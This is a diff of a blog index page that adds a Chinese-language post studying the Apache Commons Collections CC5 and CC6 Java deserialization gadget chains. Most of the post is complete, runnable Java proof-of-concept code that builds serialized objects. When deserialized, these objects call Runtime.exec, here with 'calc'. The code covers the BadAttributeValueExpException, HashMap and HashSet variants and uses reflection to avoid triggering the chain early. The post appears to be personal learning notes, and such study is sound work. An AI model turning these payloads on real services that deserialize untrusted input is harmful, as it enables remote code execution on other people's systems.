@@ -172,6 +172,388 @@
         
 
 <div class="post">
+    <a href="/2024/03/03/CommonsCollections5-6/">
+        <h2 class="post-title">CommonsCollections5 6</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/3/3
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="cc5"><a href="#cc5" class="headerlink" title="cc5"></a>cc5</h1><pre><code class="ini">Gadget chain:
+        ObjectInputStream.readObject()
+            BadAttributeValueExpException.readObject()
+                TiedMapEntry.toString()
+                    LazyMap.get()
+                        ChainedTransformer.transform()
+                            ConstantTransformer.transform()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Class.getMethod()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.getRuntime()
+                            InvokerTransformer.transform()
+                                Method.invoke()
+                                    Runtime.exec()
+</code></pre>
+<p>相较于cc1 把LazyMap的上层改了 没有使用动态代理</p>
+<p>拼一下先</p>
+<p>然后去找调用get的</p>
+<p>调用get的非常多 这里选择的是<code>TiedMapEntry.toString()</code></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030807002.png" alt="image-20240303080650311"></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030807992.png" alt="image-20240303080733554"></p>
+<p>toString也非常多</p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030809346.png" alt="image-20240303080955216"></p>
+<p>这里用的BadAttributeValueExpException#ReadObject</p>
+<pre><code class="java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
+
+import javax.management.BadAttributeValueExpException;
+import javax.xml.ws.Action;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+
+public class CC5 &#123;
+    public static void main(String[] args) throws Exception &#123;
+        String payload = &quot;calc&quot;;
+
+        HashMap hashMap = new HashMap();
+        hashMap.put(&quot;fault&quot;,&quot;fault&quot;);
+        Transformer[] transformers = &#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;payload&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+
+        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);
+        BadAttributeValueExpException bavee = new BadAttributeValueExpException(new TiedMapEntry(lazyMap,null));
+
+
+//        byte[] bytes = serialize(bavee);
+//        System.out.println(Base64.getEncoder().encodeToString(bytes));
+        
+
+//        unSerialize(bytes);
+
+    &#125;
+
+    public static byte[] serialize(Object obj) &#123;
+        try &#123;
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(baos);
+            oos.writeObject(obj);
+            return baos.toByteArray();
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+    &#125;
+    public static Object unSerialize(byte[] bytes) &#123;
+        try &#123;
+            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
+            return ois.readObject();
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125; catch (ClassNotFoundException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+
+    &#125;
+
+
+
+&#125;
+</code></pre>
+<p>我们发现在还没反序列化的时候就弹计算器了</p>
+<p>那么我们就要用反射赋值</p>
+<p>在生成的时候打断链子</p>
+<pre><code class="java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.management.BadAttributeValueExpException;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.HashMap;
+
+
+public class CC5 &#123;
+    public static void main(String[] args) throws Exception &#123;
+        String payload = &quot;calc&quot;;
+
+        HashMap hashMap = new HashMap();
+        hashMap.put(&quot;fault&quot;,&quot;fault&quot;);
+        Transformer[] transformers = &#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;payload&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+
+        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, null);
+        BadAttributeValueExpException bavee = new BadAttributeValueExpException(1);
+
+        Field fieldVal = bavee.getClass().getDeclaredField(&quot;val&quot;);
+        fieldVal.setAccessible(true);
+        fieldVal.set(bavee,tiedMapEntry);
+
+        byte[] bytes = serialize(bavee);
+//        System.out.println(Base64.getEncoder().encodeToString(bytes));
+
+
+        unSerialize(bytes);
+
+    &#125;
+
+    public static byte[] serialize(Object obj) &#123;
+        try &#123;
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(baos);
+            oos.writeObject(obj);
+            return baos.toByteArray();
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+    &#125;
+    public static Object unSerialize(byte[] bytes) &#123;
+        try &#123;
+            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
+            return ois.readObject();
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125; catch (ClassNotFoundException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+
+    &#125;
+
+
+
+&#125;
+</code></pre>
+<h1 id="cc6"><a href="#cc6" class="headerlink" title="cc6"></a>cc6</h1><pre><code class="ini">Gadget chain:
+        java.io.ObjectInputStream.readObject()
+            java.util.HashSet.readObject()
+                java.util.HashMap.put()
+                java.util.HashMap.hash()
+                   TiedMapEntry.hashCode()
+                    TiedMapEntry.getValue()
+                        LazyMap.get()
+                           ChainedTransformer.transform()
+                           InvokerTransformer.transform()
+</code></pre>
+<p><code>TiedMapEntry#hashCode</code>调了getValue</p>
+<p><code>HashMap#hash调了hashcode</code></p>
+<p><img src="https://img-host-arcueid.oss-cn-hangzhou.aliyuncs.com/img202403030909384.png" alt="image-20240303090927274"></p>
+<p><code>HashMap#readObject-&gt; HashMap#hash</code></p>
+<p>需要注意的是<code>HashMap#put</code>也调用了HashMap#hash 由HashSet#ReadObject可以跟进来</p>
+<h2 id="HashMap版"><a href="#HashMap版" class="headerlink" title="HashMap版"></a>HashMap版</h2><p>需要注意的是还没反序列化的时候就弹计算器了 需要手动断一下链子 反射补上 和 URLDNS那个是一个问题</p>
+<p><img src="https://img-blog.csdnimg.cn/db9bcf8b2d5240efb99a9c6adaa8ba27.png" alt="在这里插入图片描述"></p>
+<p>put完了之后进不去</p>
+<p>所以最后要remove掉put进去的key</p>
+<pre><code class="java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.HashMap;
+
+
+
+public class CC6 &#123;
+    public static void main(String[] args) throws Exception &#123;
+        String payload = &quot;calc&quot;;
+
+        HashMap hashMap = new HashMap();
+        hashMap.put(&quot;fault&quot;,&quot;fault&quot;);
+        Transformer[] transformers = &#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;payload&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+
+        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,new ConstantTransformer(1));
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;xxx&quot;);
+        HashMap&lt;Object, Object&gt; finalMap = new HashMap&lt;&gt;();
+        finalMap.put(tiedMapEntry,null);
+        lazyMap.remove(&quot;xxx&quot;);
+
+
+        Field fieldFactory = lazyMap.getClass().getDeclaredField(&quot;factory&quot;);
+        fieldFactory.setAccessible(true);
+        fieldFactory.set(lazyMap,chainedTransformer);
+        byte[] bytes = serialize(finalMap);
+
+        unSerialize(bytes);
+
+    &#125;
+
+    public static byte[] serialize(Object obj) &#123;
+        try &#123;
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(baos);
+            oos.writeObject(obj);
+            return baos.toByteArray();
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+    &#125;
+    public static Object unSerialize(byte[] bytes) &#123;
+        try &#123;
+            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
+            return ois.readObject();
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125; catch (ClassNotFoundException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+
+    &#125;
+
+
+
+&#125;
+</code></pre>
+<h2 id="HashSet版"><a href="#HashSet版" class="headerlink" title="HashSet版"></a>HashSet版</h2><p>网上找了几篇都没写HashSet的 不知道为什么</p>
+<pre><code class="java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.HashSet;
+
+
+public class CC6 &#123;
+    public static void main(String[] args) throws Exception &#123;
+        String payload = &quot;calc&quot;;
+
+        HashMap hashMap = new HashMap();
+        hashMap.put(&quot;fault&quot;,&quot;fault&quot;);
+        Transformer[] transformers = &#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;payload&#125;)
+        &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+
+        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,new ConstantTransformer(1));
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;xxx&quot;);
+        HashMap&lt;Object, Object&gt; finalMap = new HashMap&lt;&gt;();
+        finalMap.put(tiedMapEntry,null);
+        lazyMap.remove(&quot;xxx&quot;);
+
+
+        Field fieldFactory = lazyMap.getClass().getDeclaredField(&quot;factory&quot;);
+        fieldFactory.setAccessible(true);
+        fieldFactory.set(lazyMap,chainedTransformer);
+
+        HashSet hashSet = new HashSet(1,1);
+        Field fieldMap = HashSet.class.getDeclaredField(&quot;map&quot;);
+        fieldMap.setAccessible(true);
+        fieldMap.set(hashSet,finalMap);
+
+        byte[] bytes = serialize(hashSet);
+
+        unSerialize(bytes);
+
+    &#125;
+
+    public static byte[] serialize(Object obj) &#123;
+        try &#123;
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(baos);
+            oos.writeObject(obj);
+            return baos.toByteArray();
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+    &#125;
+    public static Object unSerialize(byte[] bytes) &#123;
+        try &#123;
+            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
+            return ois.readObject();
+        &#125; catch (IOException e) &#123;
+            throw new RuntimeException(e);
+        &#125; catch (ClassNotFoundException e) &#123;
+            throw new RuntimeException(e);
+        &#125;
+
+    &#125;
+
+
+
+&#125;
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/java/" style="color: #00a596">java</a>
+        </span>
+        
+    </div>
+    <a href="/2024/03/03/CommonsCollections5-6/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2024/03/03/CommonsCollections3-4/">
         <h2 class="post-title">CommonsCollections3 4</h2>
     </a>
@@ -636,7 +1018,7 @@ public class CC2 &#123;
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #ffa2c4">java</a>
+            <a href="/tags/java/" style="color: #00bcd4">java</a>
         </span>
         
     </div>
@@ -1044,7 +1426,7 @@ public class CC1LazyVersion &#123;
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #00bcd4">java</a>
+            <a href="/tags/java/" style="color: #03a9f4">java</a>
         </span>
         
     </div>
